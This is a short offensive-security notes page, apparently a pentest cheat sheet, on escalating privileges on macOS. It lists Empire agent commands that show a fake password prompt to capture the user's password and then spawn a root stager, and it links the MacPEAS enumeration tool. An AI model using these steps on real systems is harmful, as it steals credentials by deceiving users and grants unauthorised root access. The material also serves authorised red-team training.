# Privilege escalation on macOS

## Attack tree

```text
1 Empire agent running on macOS (AND)
2 Interact with agent
    2.1 > usemodule (double tab to list modules available) (AND)
    2.2 > usemodule collection/osx/prompt (not opsec safe, we'll be leaving traces)
    2.3 > execute (and copy user password)
    2.4 > Back
    2.5 > usemodule privesc/multi/sudo_spawn (executes another stager with admin priviliges, and requires a password)
    2.6 > info (to see all options)
    2.7 > set Password [user password]
    2.8 > set Listener [value] (http in our case)
    2.9 > execute

```

## Notes

* This method does not rely on programs and exploits and is highly likely to work as users are trained to enter their passwords regularly for the Apple Store. A new agent appears, one that is root. 
* This example uses macOS but a similar process works for other OS as well. The modules will be different tnough.
* In horizontal privilege escalation an adversary expands privileges by taking over another account.
* In vertical privilege escalation an attacker attempts to gain more permissions or access with an existing compromised account.

## Tools

* [MacPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) - Just execute `linpeas.sh` in a MacOS system and the MacPEAS version will be automatically executed

## Cheatsheets

* [Empire wiki](https://bc-security.gitbook.io/empire-wiki/)